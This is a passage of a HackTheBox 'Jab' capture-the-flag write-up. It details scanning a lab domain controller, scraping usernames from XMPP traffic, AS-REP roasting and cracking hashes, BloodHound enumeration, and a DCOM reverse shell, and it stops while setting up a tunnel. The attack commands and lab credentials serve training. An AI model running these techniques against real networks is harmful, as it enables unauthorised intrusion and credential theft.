---
title: HTB-Jab
draft: false
tags:
  - htb
  - windows
  - medium
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/Jab.png)

## Information Gathering
### Rustscan

Rustscan discovers many ports open. Based on the ports open, target seems to be Windows Domain Controller. 

`rustscan --addresses 10.10.11.4 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-43.png)

### Nmap

```bash
┌──(yoon㉿kali)-[~/Documents/htb/jab]
└─$ sudo nmap -sVC -p 53,88,135,139,445,464,3268,3269,5222,5223,5262,5269,5270,5275,5276,5985,7070,7443,7777,9389,47001,49665,49675,49686,49691,49843 10.10.11.4 -vv
<snip>
Host is up, received reset ttl 127 (0.61s latency).
Scanned at 2024-05-21 10:58:54 EDT for 247s

PORT      STATE SERVICE             REASON          VERSION
53/tcp    open  domain              syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec        syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-05-21 14:53:44Z)
135/tcp   open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?       syn-ack ttl 127
464/tcp   open  kpasswd5?           syn-ack ttl 127
3268/tcp  open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA/domainComponent=jab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
| SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
| -----BEGIN CERTIFICATE-----
| MIIFvzCCBKegAwIBAgITWQAAAAJSWxt6j5iOJQAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBAMRMwEQYKCZImiZPyLGQBGRYDaHRiMRMwEQYKCZImiZPyLGQBGRYDamFiMRQw
| EgYDVQQDEwtqYWItREMwMS1DQTAeFw0yMzExMDEyMDE2MThaFw0yNDEwMzEyMDE2
| MThaMBcxFTATBgNVBAMTDERDMDEuamFiLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBALyhhrIoyeCxIBUfY1mo1AQrYI4nNbsonppA338bO9USvrUw
| TR9/V+3rMU4S/vei+s2FigycUrzpaU749n9rySQ9/34p8gtJhnubmlPQW8lhh6qN
| IjOWix7BSlEhhgW0ClbDYsvlQ/dgXtHsEjxbjTsVidZvYh5nL0fQvT61P0Hm8nkO
| p7RTZD+euaq+O+qF1LwMYgU0yAAGlNEUTz44AVv3BcI9I3bQa0uOMdejzU07hf0d
| x1vbjz/6vwKVvv72UegWd7R6ANtNgoy9cO60IA7cEHshrnzfcQWpcaOhJgxMkHFS
| 2ThIJMvVEmBY1Yu1oqP3qcMA2ijUU8FXhJYgvHECAwEAAaOCAtkwggLVMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFHENgbJKRZdbCWcWTu4RAzn7
| mseRMB8GA1UdIwQYMBaAFMn7KguvyJy7fx00uETxw3ADj7zeMIHCBgNVHR8Egbow
| gbcwgbSggbGgga6GgatsZGFwOi8vL0NOPWphYi1EQzAxLUNBLENOPURDMDEsQ049
| Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
| bmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbkGCCsG
| AQUFBwEBBIGsMIGpMIGmBggrBgEFBQcwAoaBmWxkYXA6Ly8vQ049amFiLURDMDEt
| Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAv
| oB8GCSsGAQQBgjcZAaASBBAWRnnI9GirQq9+bBt8gwIaggxEQzAxLmphYi5odGIw
| DQYJKoZIhvcNAQEFBQADggEBAEwUT144zjzpCYcyp41JW1XTpAHMkw8YNclKebjP
| 699ip5bQjpC0fwpaXKo+iMZSklytnMVzYETvQ/wr1bGhn5DAvXUK4GN4VaKMho5+
| KcsYBaBlAMCZZbB9Z/zX5nGRDw2Qj6rcoaKssQK2ACFTTWYB/4VZjJhuF275SADB
| qeRsu+Hfc1/h73cDybRKj+8jvphAZPS8wdYq853G08RQghdnKhlGCwRY10RN541L
| j97DUyucvHWAqdXMWshe3chacNaWdBaxg3BOeRuMsfEEn8O3G5643+wZbAH+FMGy
| eb2uiaxUOLycSsONAQ6qt4bwEVGmyOJTHbpwTB8YSJBFU0A=
|_-----END CERTIFICATE-----
3269/tcp  open  globalcatLDAPssl?   syn-ack ttl 127
|_ssl-date: 2024-05-21T14:55:58+00:00; -5m29s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA/domainComponent=jab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
| SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
| -----BEGIN CERTIFICATE-----
| MIIFvzCCBKegAwIBAgITWQAAAAJSWxt6j5iOJQAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBAMRMwEQYKCZImiZPyLGQBGRYDaHRiMRMwEQYKCZImiZPyLGQBGRYDamFiMRQw
| EgYDVQQDEwtqYWItREMwMS1DQTAeFw0yMzExMDEyMDE2MThaFw0yNDEwMzEyMDE2
| MThaMBcxFTATBgNVBAMTDERDMDEuamFiLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBALyhhrIoyeCxIBUfY1mo1AQrYI4nNbsonppA338bO9USvrUw
| TR9/V+3rMU4S/vei+s2FigycUrzpaU749n9rySQ9/34p8gtJhnubmlPQW8lhh6qN
| IjOWix7BSlEhhgW0ClbDYsvlQ/dgXtHsEjxbjTsVidZvYh5nL0fQvT61P0Hm8nkO
| p7RTZD+euaq+O+qF1LwMYgU0yAAGlNEUTz44AVv3BcI9I3bQa0uOMdejzU07hf0d
| x1vbjz/6vwKVvv72UegWd7R6ANtNgoy9cO60IA7cEHshrnzfcQWpcaOhJgxMkHFS
| 2ThIJMvVEmBY1Yu1oqP3qcMA2ijUU8FXhJYgvHECAwEAAaOCAtkwggLVMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFHENgbJKRZdbCWcWTu4RAzn7
| mseRMB8GA1UdIwQYMBaAFMn7KguvyJy7fx00uETxw3ADj7zeMIHCBgNVHR8Egbow
| gbcwgbSggbGgga6GgatsZGFwOi8vL0NOPWphYi1EQzAxLUNBLENOPURDMDEsQ049
| Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
| bmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbkGCCsG
| AQUFBwEBBIGsMIGpMIGmBggrBgEFBQcwAoaBmWxkYXA6Ly8vQ049amFiLURDMDEt
| Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAv
| oB8GCSsGAQQBgjcZAaASBBAWRnnI9GirQq9+bBt8gwIaggxEQzAxLmphYi5odGIw
| DQYJKoZIhvcNAQEFBQADggEBAEwUT144zjzpCYcyp41JW1XTpAHMkw8YNclKebjP
| 699ip5bQjpC0fwpaXKo+iMZSklytnMVzYETvQ/wr1bGhn5DAvXUK4GN4VaKMho5+
| KcsYBaBlAMCZZbB9Z/zX5nGRDw2Qj6rcoaKssQK2ACFTTWYB/4VZjJhuF275SADB
| qeRsu+Hfc1/h73cDybRKj+8jvphAZPS8wdYq853G08RQghdnKhlGCwRY10RN541L
| j97DUyucvHWAqdXMWshe3chacNaWdBaxg3BOeRuMsfEEn8O3G5643+wZbAH+FMGy
| eb2uiaxUOLycSsONAQ6qt4bwEVGmyOJTHbpwTB8YSJBFU0A=
|_-----END CERTIFICATE-----
5222/tcp  open  jabber              syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: TLS randomness does not represent time
5223/tcp  open  hpvirtgrp?          syn-ack ttl 127
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
| SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
5262/tcp  open  jabber              syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: eko7v1lpx
|     compression_methods: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
|_    features: 
5269/tcp  open  xmpp                syn-ack ttl 127 Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     compression_methods: 
|     auth_mechanisms: 
|     xmpp: 
|     unknown: 
|     errors: 
|       (timeout)
|_    features: 
5270/tcp  open  xmp?                syn-ack ttl 127
5275/tcp  open  jabber              syn-ack ttl 127
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 3eqjc2fjvo
|     compression_methods: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
|_    features: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  unknown             syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
| SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| http-methods: 
|_  Supported Methods: GET OPTIONS
7070/tcp  open  realserver?         syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 21 May 2024 14:53:41 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 21 May 2024 14:53:56 GMT
|_    Allow: GET,HEAD,POST,OPTIONS
7443/tcp  open  ssl/oracleas-https? syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
| SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
7777/tcp  open  socks5              syn-ack ttl 127 (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              syn-ack ttl 127 .NET Message Framing
47001/tcp open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  unknown             syn-ack ttl 127
49675/tcp open  unknown             syn-ack ttl 127
49686/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  unknown             syn-ack ttl 127
49843/tcp open  tcpwrapped          syn-ack ttl 127

<snip>
Nmap done: 1 IP address (1 host up) scanned in 247.50 seconds
           Raw packets sent: 54 (2.352KB) | Rcvd: 41 (1.808KB)
```


## Enumeration
### SMB - TCP 445

Since this is a DC machine, let's start with enumerating SMB:

`crackmapexec smb 10.10.11.4`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image.png)

Let's add **jab.htb** and **dc01.jab.htb** to `/etc/hosts`:
### DNS - TCP 53

Next, let's move on to enumerating DNS:

`dig axfr @10.10.11.4 jab.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-1.png)

Unfortunately zone transfer fails.
### HTTPs - TCP 7443

There's Openfire HTTP Binding Service running on port 7443:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-2.png)

**What is Openfire?**

**Openfire** is a real-time collaboration server that uses the **XMPP** protocol. It is written in Java and can support thousands of concurrent users. Openfire includes several key features, such as:

- User-friendly web-based administration panel
- Support for plugins
- SSL/TLS for security
- Integration with LDAP for user authentication

One of the features of Openfire is HTTP binding, which allows XMPP clients to connect to the server using HTTP or HTTPS, making it possible to use XMPP over web browsers. This is especially useful for web-based XMPP clients.

## XMPP - TCP 5222

In order to interact with **XMPP**, let's install [Spark](https://igniterealtime.org/downloads/#spark).

After starting Spark, go to **Advanced** and set the host as our target machine and set port as 5222:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-18.png)

Encryption mode should be disabled as well:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-5.png)

Now let's create a new account:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-3.png)

Using the new account, we can login to the XMPP server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-7.png)

### XMPP Enumeration

Going to **Actions** -> **Join conference room**, we see two rooms: **test** and **test2**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-8.png)

**test** is encrypted and **test2** is accessible:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-9.png)

We see a message from **bdavis**, which seems to be encrpyted with base64:

`<img src="data:image/png;base64,VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==" alt="some text" />`

We can decrypt it using **base64**, but nothing useful is seen:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-10.png)

Going to **Conferences**, new subdomain **conference.jab.htb** is discovered:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-11.png)

**Search** provides user search service:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-12.png)

Using this feature, we can obtain list of potential users on domain:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-13.png)

Using this usernames, we can perform AS-REP Roasting attack. However, it is not possible copy-paste or export this list of users. 

We would have to find a way around it.


### User List Retrieval

So our plan here is to listen on Spark's user search function and sort out list of usernames.

Let's first start a **tcpdump** listener on our HTB VPN network:

`sudo tcmpdump -i tun0 -w output1.pcap`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-14.png)

Now let's sort out the username as such:

`sudo cat output1.pcap | grep -a -oP '(?<=<field var="Username"><value>)[^<]+'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-15.png)

We now have set of usernames ready for AS-REP Roasting attack. 

## AS-REP Roast

With the list of usernames, let's perform AS-REP Roasting:

`sudo GetNPUsers.py 'jab.htb/' -user user.list -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.11.4`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-16.png)

After waiting a while for the scan to complete, we can see that users **jmontgomery**, **lbradford**, and **mlowe** has **UF_DONT_REQUIRE_PREAUTH** set:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-4.png)

Now let's move on to cracking these hashes.
### Hash Crack

Let's use hashcat mode 18200 for cracking above hashes.

`hascat -m 18200 hashes rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/jab1.png)

Only hash for **jmontgomery** is cracked and the password is: **Midnight_121**

## Shell as svc_openfire
### XMPP as jmontgomery

Now that we have obtained credentials for **jmontgomery**, let's sign-in to XMPP as **jmontgomery** and see what it in there:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-6.png)

Looking at open chat rooms, we see one more interesting room: **2003 Third Party Pentest Discussion**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-19.png)

Let's take a look into it. 

It seems like **adunn** and **bdavis** is talking about misconfiguration they discovered during a pentest regarding **svc_openfire** account:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-20.png)

Scrolling down a little more, password hash for **svc_openfire** is found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-21.png)

Even without the need for us to crack it, they provided cracked password in plain text:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-22.png)

Password for **svc_openfire** should be `!@#$%^&*(1qazxsw`.

### Bloodhound

Now let's enumerate the AD environment using Bloodhound and user **svc_openfire**'s credentials:

`sudo bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -dc DC01.jab.htb -c all -ns 10.10.11.4 --dns-timeout 30`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-23.png)

After spinning up **neo4j console** and **bloodhound**, we first mark **svc_openfire** as owned:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-24.png)

Poking around Bloodhound, we see that there's **ExecuteDCOM** right from **svc_openfire** to **DC01.jab.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-25.png)

This will allow us to run commands on the Domain Controller:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-26.png)

Using this, we will be able to spawn reverse shell as the uer **svc_openfire**.

### ExecuteDCOM

Before exploiting **ExecuteDCOM**, let's first prepare reverse shell payload using [revshell](www.revshells.com):


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-27.png)

Now using **dcomexec.py**, we should be able to spawn a reverse shell on our netcat listener:

`dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'reverse_shell_command' -silentcommand`

After running the command, we have reverse shell connection on our netcat listener as **svc_openfire**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-28.png)

It is now time for us to move on to privilege escalation.
## Privesc: svc_openfire to system

Let's first see if there's any interesting ports open internally:

`netstat -ano | findstr '127.0.0.1'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-29.png)

We can see that port **9090** and **9091** is open internally and we don't usually see this. 

Let's see if it is running a website on it:

`Invoke-WebRequest -Uri http://127.0.0.1:9090/ -UseBasicParsing`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-30.png)

It seems like port 9090 is running a website on it. 

Let's tunnel it to our local Kali machine to take a look at it. 

### Chisel

Let's move **Chisel** executable to the target machine.

First, we start smbserver:

`impacket-smbserver share -smb2support $(pwd)`

